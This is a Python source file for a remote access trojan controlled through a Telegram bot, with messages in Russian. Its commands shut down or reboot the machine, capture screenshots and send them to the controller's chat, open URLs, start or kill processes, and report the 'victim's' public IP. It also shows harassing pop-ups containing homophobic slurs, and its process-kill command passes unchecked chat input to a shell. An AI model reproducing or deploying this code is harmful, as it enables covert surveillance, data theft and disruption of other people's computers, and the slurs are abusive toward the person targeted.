import random,telebot,os,webbrowser,pyautogui,time,requests,re
from PIL import Image, ImageGrab
from bs4 import BeautifulSoup



mytoken = 'telegram token'

bot = telebot.TeleBot(mytoken)

@bot.message_handler(content_types=['text'])
def commands(message):
        if message.text == '/off':
                bot.send_message(message.chat.id,'Компьютер будет выключен!')
                os.system('shutdown -s')


        elif message.text == '/open':
                bot.register_next_step_handler(message,get_url)
                bot.send_message(message.chat.id,'Отправьте ссылку!')
                

        elif message.text == '/screen':
                try:  
                        os.remove("screenshot.png")
                except:
                        bot.send_message(message.chat.id,'Делаю скриншот')
                        screen = pyautogui.screenshot('screenshot.png')
                        screen = open('screenshot.png', 'rb')
                        bot.send_photo(message.chat.id, screen)
                
        elif message.text == '/process':
                bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)')
                bot.register_next_step_handler(message,get_process)
        
        
        elif message.text == '/ip':
                url = 'https://yandex.ru/internet/'
                page = requests.get(url)
                soup = BeautifulSoup(page.text, "html.parser")
                ip = soup.findAll('ul', class_='general-info layout__general-info')
                ip = str(ip)
                ip = re.sub('<[^>]*>', '\n', ip)
                bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip))
        
        
        
        elif message.text == '/window':
                pyautogui.alert("Ты пидор", "Тест", button="да")
                pyautogui.alert("Ты гей", "Тест", button="да")
                bot.send_message(message.chat.id,'Окна с тестом на гея созданы')
                
        elif message.text == '/kill':
                bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
                bot.register_next_step_handler(message,get_kill)                   
                
                
        elif message.text == '/reboot':
                os.system('shutdown -r -t 0')

                
                
def get_url(message):
        global url
        url = message.text
        webbrowser.open_new(url)
        bot.send_message(message.chat.id,'Ссылка открыта!')


        
        
def get_process(message):
        global process
        process = message.text
        try:
                os.startfile(process)
                bot.send_message(message.chat.id,'Включил данный процесс\n' + process)
        except:
                 bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!')

                        
                        
                        
                        
def get_kill(message):
        global kill
        kill = message.text
        try:
                os.system("taskkill /im " + kill)
                bot.send_message(message.chat.id,'Данный процесс убит\n' + kill)
        except:
                bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!')

                
                        
         
try:
        bot.polling(none_stop=True, interval=0)
except:
        pass
